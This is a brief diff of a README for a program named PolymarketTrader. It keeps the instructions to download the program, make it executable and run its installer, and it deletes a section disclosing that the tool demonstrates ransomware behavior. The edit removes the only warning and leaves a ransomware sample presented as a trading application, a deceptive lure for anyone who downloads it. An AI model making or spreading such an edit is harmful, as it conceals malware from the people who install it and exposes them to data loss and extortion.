@@ -78,9 +78,6 @@ chmod +x PolymarketTrader
 
 After you download, follow the installation process displayed by the program.
 
-## Educational Purpose
-
-This tool is designed for educational purposes to demonstrate ransomware behavior in a controlled environment. Use responsibly and only in authorized testing environments.
 
 ## Support
 
